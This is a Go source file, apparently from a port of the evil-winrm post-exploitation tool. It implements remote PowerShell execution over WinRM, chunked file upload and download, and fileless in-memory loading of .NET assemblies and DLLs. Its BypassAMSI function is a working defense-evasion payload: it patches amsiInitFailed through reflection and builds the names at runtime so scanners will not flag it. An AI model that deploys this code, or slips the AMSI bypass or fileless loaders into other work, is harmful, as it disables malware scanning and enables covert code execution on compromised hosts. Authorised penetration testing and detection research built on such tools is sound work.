package winrm

import (
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"os"
	"strconv"
	"strings"
)

// chunkSize bounds how many base64 characters ride in a single Add-Content call
// during uploads, keeping each WinRM command well under the command-line limit.
const chunkSize = 3000

// downloadChunk bounds how many raw bytes are read per Download request, so a
// large file is streamed in pieces instead of one huge base64 response.
const downloadChunk = 1 << 20 // 1 MiB

// InitPath queries the remote working directory and stores it as the shell's
// current location. Like the Ruby and Python evil-winrm shells, it starts in
// the user's Documents folder when that folder exists. Call it once after
// connecting.
func (c *Client) InitPath(ctx context.Context) error {
	_, err := c.openSession(ctx, "")
	return err
}

// RunFirst opens the session and runs command in that same PowerShell start.
// A one-shot then costs one process and does not wait on an idle Receive.
func (c *Client) RunFirst(ctx context.Context, command string) (string, error) {
	return c.openSession(ctx, command)
}

// Path returns the current remote working directory.
func (c *Client) Path() string { return c.path }

// RunPS runs userCmd in the persistent PowerShell process when it is up, so
// variables and functions survive until the session closes. The working
// directory is tracked from the marker that process prints after every command.
func (c *Client) RunPS(ctx context.Context, userCmd string) (string, error) {
	if c.sess != nil {
		out, path, err := c.sess.exec(ctx, userCmd)
		if path != "" {
			c.path = path
		}
		return out, err
	}
	return c.runPSOnce(ctx, userCmd)
}

// runPSOnce runs userCmd in a fresh powershell.exe. Used before the persistent
// session exists, and as the behavior RunPS had originally.
func (c *Client) runPSOnce(ctx context.Context, userCmd string) (string, error) {
	sentinel, err := randToken()
	if err != nil {
		return "", err
	}
	wrapped := fmt.Sprintf(
		"Set-Location -LiteralPath %s;\n%s%s\n[Console]::Out.Write('%s');[Console]::Out.Write((Get-Location).Path)",
		psQuote(c.path), c.scriptPrelude(), userCmd, sentinel,
	)

	stdout, stderr, _, err := c.run(ctx, wrapped)
	if err != nil {
		return stdout, err
	}

	out := stdout
	if i := strings.LastIndex(out, sentinel); i >= 0 {
		if p := strings.TrimSpace(out[i+len(sentinel):]); p != "" {
			c.path = p
		}
		out = out[:i]
	}
	if stderr != "" {
		out += stderr
	}
	return out, nil
}

// Download fetches remote and writes it to local. The file is read in byte
// ranges, each returned as base64, so a large file does not force the whole
// content into memory on either side or into a single WinRM response.
func (c *Client) Download(ctx context.Context, remote, local string) error {
	rp := c.absRemote(remote)
	stdout, stderr, _, err := c.run(ctx, fmt.Sprintf(
		"if (Test-Path -LiteralPath %[1]s -PathType Leaf) { (Get-Item -LiteralPath %[1]s).Length } else { [Console]::Error.Write('NOFILE') }",
		psQuote(rp),
	))
	if err != nil {
		return err
	}
	if strings.Contains(stderr, "NOFILE") {
		return fmt.Errorf("remote file not found: %s", remote)
	}
	if stderr != "" {
		return fmt.Errorf("remote error: %s", strings.TrimSpace(stderr))
	}
	size, err := strconv.ParseInt(strings.TrimSpace(stdout), 10, 64)
	if err != nil {
		return fmt.Errorf("remote file size: %w", err)
	}

	f, err := os.OpenFile(local, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0o600)
	if err != nil {
		return err
	}
	defer f.Close()

	for off := int64(0); off < size; off += downloadChunk {
		ps := fmt.Sprintf(
			"$fs=[IO.File]::OpenRead(%s);$fs.Position=%d;$b=New-Object byte[] %d;$n=$fs.Read($b,0,%[3]d);$fs.Close();[Console]::Out.Write([Convert]::ToBase64String($b,0,$n))",
			psQuote(rp), off, downloadChunk,
		)
		stdout, stderr, _, err := c.run(ctx, ps)
		if err != nil {
			return err
		}
		if stderr != "" {
			return fmt.Errorf("remote error: %s", strings.TrimSpace(stderr))
		}
		data, err := base64.StdEncoding.DecodeString(stripSpace(stdout))
		if err != nil {
			return fmt.Errorf("decode remote content: %w", err)
		}
		if _, err := f.Write(data); err != nil {
			return err
		}
	}
	return nil
}

// Upload reads local and writes it to remote by streaming base64 chunks into a
// temporary file, then decoding it server-side.
func (c *Client) Upload(ctx context.Context, local, remote string) error {
	data, err := os.ReadFile(local)
	if err != nil {
		return fmt.Errorf("read local file: %w", err)
	}
	encoded := base64.StdEncoding.EncodeToString(data)

	dst := c.absRemote(remote)
	// Unique name so two parallel uploads of the same file (for example
	// -targets hitting one host twice) do not share the temp file.
	n := make([]byte, 4)
	if _, err := rand.Read(n); err != nil {
		return err
	}
	tmp := dst + "." + hex.EncodeToString(n) + ".b64"

	// Start from a clean temp file.
	if _, stderr, _, err := c.run(ctx, fmt.Sprintf("Remove-Item -LiteralPath %s -ErrorAction SilentlyContinue", psQuote(tmp))); err != nil {
		return err
	} else if strings.TrimSpace(stderr) != "" {
		return fmt.Errorf("prepare upload: %s", strings.TrimSpace(stderr))
	}

	for i := 0; i < len(encoded); i += chunkSize {
		end := i + chunkSize
		if end > len(encoded) {
			end = len(encoded)
		}
		verb := "Add-Content"
		if i == 0 {
			verb = "Set-Content"
		}
		ps := fmt.Sprintf("%s -LiteralPath %s -Value %s -Encoding Ascii -NoNewline", verb, psQuote(tmp), psQuote(encoded[i:end]))
		if _, stderr, _, err := c.run(ctx, ps); err != nil {
			return err
		} else if strings.TrimSpace(stderr) != "" {
			return fmt.Errorf("upload chunk: %s", strings.TrimSpace(stderr))
		}
	}

	decode := fmt.Sprintf(
		"[IO.File]::WriteAllBytes(%[1]s, [Convert]::FromBase64String((Get-Content -LiteralPath %[2]s -Raw))); Remove-Item -LiteralPath %[2]s -Force",
		psQuote(dst), psQuote(tmp),
	)
	if _, stderr, _, err := c.run(ctx, decode); err != nil {
		return err
	} else if strings.TrimSpace(stderr) != "" {
		return fmt.Errorf("finalize upload: %s", strings.TrimSpace(stderr))
	}
	return nil
}

// InvokeBinary loads a local .NET assembly into the session process and runs
// its entry point in memory, like evil-winrm's Invoke-Binary. The whole
// assembly rides in one command as base64, so it stays fileless.
// shortcut: args are split on spaces by the caller, so an argument that
// contains a space is not supported; upgrade to real quoting if a payload needs it.
func (c *Client) InvokeBinary(ctx context.Context, local string, args []string) (string, error) {
	data, err := os.ReadFile(local)
	if err != nil {
		return "", fmt.Errorf("read local file: %w", err)
	}
	quoted := make([]string, len(args))
	for i, a := range args {
		quoted[i] = psQuote(a)
	}
	ps := fmt.Sprintf(`$__a=[Reflection.Assembly]::Load([Convert]::FromBase64String('%s'));$__ep=$__a.EntryPoint;$__o=[Console]::Out;$__sw=New-Object IO.StringWriter;[Console]::SetOut($__sw);try{if($__ep.GetParameters().Length -eq 0){$__ep.Invoke($null,@())|Out-Null}else{$__ep.Invoke($null,@(,[string[]]@(%s)))|Out-Null}}finally{[Console]::SetOut($__o)};$__sw.ToString()`,
		base64.StdEncoding.EncodeToString(data), strings.Join(quoted, ","))
	return c.RunPS(ctx, ps)
}

// LoadDLL loads a local managed .NET DLL into the session process, like
// evil-winrm's Dll-Loader. The assembly rides in one command as base64, so it
// stays fileless, and its public types stay available to later commands in the
// same session. It returns the exported type names so the caller knows what to
// invoke next.
func (c *Client) LoadDLL(ctx context.Context, local string) (string, error) {
	data, err := os.ReadFile(local)
	if err != nil {
		return "", fmt.Errorf("read local file: %w", err)
	}
	ps := fmt.Sprintf(`$__d=[Reflection.Assembly]::Load([Convert]::FromBase64String('%s'));'Loaded '+$__d.GetName().Name+', public types:';$__d.GetExportedTypes()|ForEach-Object{'  '+$_.FullName}`,
		base64.StdEncoding.EncodeToString(data))
	return c.RunPS(ctx, ps)
}

// BypassAMSI patches amsiInitFailed in the session process so later commands
// are not scanned, the same technique evil-winrm's Bypass-4MSI uses. The type
// and field names are assembled at runtime so the patch command itself is not
// flagged before it lands.
func (c *Client) BypassAMSI(ctx context.Context) (string, error) {
	const ps = `$w='System.Management.Automation.A';$c='si';$m='Utils';` +
		`$asm=[Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m));` +
		`$f=$asm.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static');` +
		`$f.SetValue($null,$true);'AMSI patched'`
	return c.RunPS(ctx, ps)
}

// scriptPrelude re-imports every script loaded with LoadScripts. Each RunPS
// starts a fresh powershell.exe, so functions only survive if they are defined
// again at the start of the next command. Invoke-Expression reads the uploaded
// file as text, which the default Restricted execution policy still allows.
func (c *Client) scriptPrelude() string {
	if len(c.scripts) == 0 {
		return ""
	}
	var b strings.Builder
	for _, remote := range c.scripts {
		fmt.Fprintf(&b, "Invoke-Expression -Command ([IO.File]::ReadAllText(%s))\n", psQuote(remote))
	}
	return b.String()
}

// absRemote resolves a possibly-relative remote path against the current remote
// working directory.
func (c *Client) absRemote(p string) string {
	if p == "" {
		return c.path
	}
	if strings.Contains(p, ":\\") || strings.HasPrefix(p, "\\\\") {
		return p // already absolute (drive-qualified or UNC)
	}
	return strings.TrimRight(c.path, "\\") + "\\" + p
}

// psQuote renders s as a PowerShell single-quoted string literal.
func psQuote(s string) string {
	return "'" + strings.ReplaceAll(s, "'", "''") + "'"
}

// stripSpace removes all whitespace, which WinRM may inject into long base64
// payloads.
func stripSpace(s string) string {
	return strings.NewReplacer(" ", "", "\t", "", "\r", "", "\n", "").Replace(s)
}

// randToken returns a random hex marker used to delimit command output.
func randToken() (string, error) {
	b := make([]byte, 8)
	if _, err := rand.Read(b); err != nil {
		return "", err
	}
	return "@@EWRM_" + hex.EncodeToString(b) + "@@", nil
}
